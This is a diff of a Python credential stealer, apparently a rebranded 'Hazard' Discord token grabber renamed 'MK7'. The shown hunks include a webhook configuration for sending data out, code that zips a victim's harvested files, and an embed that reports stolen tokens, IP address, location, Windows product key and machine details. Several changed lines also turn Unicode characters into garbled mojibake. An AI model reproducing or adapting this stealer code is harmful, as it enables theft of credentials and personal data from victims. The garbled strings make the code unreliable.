@@ -26,7 +26,7 @@ __author__ = "drope"
 __version__ = '1.8.7'
 __license__ = "GPL-3.0"
 __config__ = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
+    # replace WEBHOOK_HERE with your webhook â†“â†“ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     'webhook': "WEBHOOK_HERE",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
@@ -613,7 +613,7 @@ GoogleMaps: {self.googlemap}
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(x + "\n\nGRABBER BY MK7")
 
-        _zipfile = ntpath.join(self.appdata, f'Hazard.V2-[{Victim}].zip')
+        _zipfile = ntpath.join(self.appdata, f'MK7-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -626,7 +626,7 @@ GoogleMaps: {self.googlemap}
         file_count, files_found, tokens = 0, '', ''
         for _, __, files in os.walk(self.dir):
             for _file in files:
-                files_found += f"・{_file}\n"
+                files_found += f"ãƒ»{_file}\n"
                 file_count += 1
         for tkn in self.tokens:
             tokens += f'{tkn}\n\n'
@@ -647,29 +647,29 @@ GoogleMaps: {self.googlemap}
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
-                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
-                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
-                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
-                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
+                                IP:á Žâ€¯{self.ip.replace(" ", "á Žâ€¯") if self.ip else "N/A"}
+                                Org:á Žâ€¯{self.org.replace(" ", "á Žâ€¯") if self.org else "N/A"}
+                                City:á Žâ€¯{self.city.replace(" ", "á Žâ€¯") if self.city else "N/A"}
+                                Region:á Žâ€¯{self.region.replace(" ", "á Žâ€¯") if self.region else "N/A"}
+                                Country:á Žâ€¯{self.country.replace(" ", "á Žâ€¯") if self.country else "N/A"}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                PCName: {Victim_pc.replace(" ", "᠎ ")}
-                                WinKey:᠎ {self.winkey.replace(" ", "᠎ ")}
-                                WinVer:᠎ {self.winver.replace(" ", "᠎ ")}
-                                DiskSpace:᠎ {disk}GB
-                                Ram:᠎ {ram}GB```
+                                PCName:â€¯{Victim_pc.replace(" ", "á Žâ€¯")}
+                                WinKey:á Žâ€¯{self.winkey.replace(" ", "á Žâ€¯")}
+                                WinVer:á Žâ€¯{self.winver.replace(" ", "á Žâ€¯")}
+                                DiskSpace:á Žâ€¯{disk}GB
+                                Ram:á Žâ€¯{ram}GB```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '**Tokens:**',
                             'value': f'''```yaml
-                                {tokens if tokens else "SEM TOKENS !"}```
+                                {tokens if tokens else "SEMâ€¯TOKENSâ€¯!"}```
                             '''.replace(' ', ''),
                             'inline': False
                         },
